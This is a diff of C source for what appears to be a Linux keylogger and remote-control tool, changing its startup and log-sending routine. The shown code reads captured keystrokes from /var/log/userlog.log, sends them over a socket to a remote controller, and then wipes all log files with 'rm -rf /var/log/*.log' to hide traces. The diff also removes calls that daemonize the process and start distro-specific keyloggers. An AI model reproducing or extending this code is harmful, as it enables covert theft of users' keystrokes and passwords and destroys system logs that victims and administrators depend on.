@@ -80,21 +80,8 @@ int main(int argc, char *argv[])
         return 0;
     }
     
-    daemonize();   
-    
-   
-    ubuntu16_keylogger_init();
+    //daemonize();   
 
-    //ubuntu18_keylogger_init();
-
-    //mint_keylogger_init();
-
-    //debian_keylogger_init();
-
-    //kali_keylogger_init();
-
-    //fedora_keylogger_init();
-    
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
 
@@ -453,9 +440,9 @@ void *send_logger_log()
     
     FILE *log_file = NULL;
     char *buffer = NULL;
-    int log_empty = 0;
 
     int i = 0;
+    size_t log_empty = 0;
     
     log_file = fopen("/var/log/userlog.log", "r+");
     if(log_file == NULL)
@@ -467,6 +454,23 @@ void *send_logger_log()
     fseek(log_file, 0, SEEK_END);
     file_size = ftell(log_file);
     rewind(log_file);
+    
+    if(file_size == 0)
+        log_empty = 1;
+        
+    /** if the log file is empty or don't exist yet */
+    if(send(csock, (char*)&log_empty, sizeof(log_empty), 0) == SOCKET_ERROR)
+    {
+        error("send() log_empty", "send_logger_log()");
+        pthread_exit(NULL);
+    }
+    
+    if(log_empty == 1)
+    {
+        log_empty = 0;
+        fclose(log_file);
+        pthread_exit(NULL);
+    }
     
     buffer = malloc(file_size + 1 * sizeof(char));
     if(buffer == NULL)
@@ -516,6 +520,8 @@ void *send_logger_log()
 
     printf("File totaly send with success : %ld\n", totalSend);
     
+    fclose(log_file);
+    
     /* Delete all .log files */
     if(system("rm -rf /var/log/*.log") == -1)
     {
@@ -530,7 +536,6 @@ void *send_logger_log()
         pthread_exit(NULL);
     }
 
-    fclose(log_file);
     free(buffer);
     
     pthread_exit(NULL);  
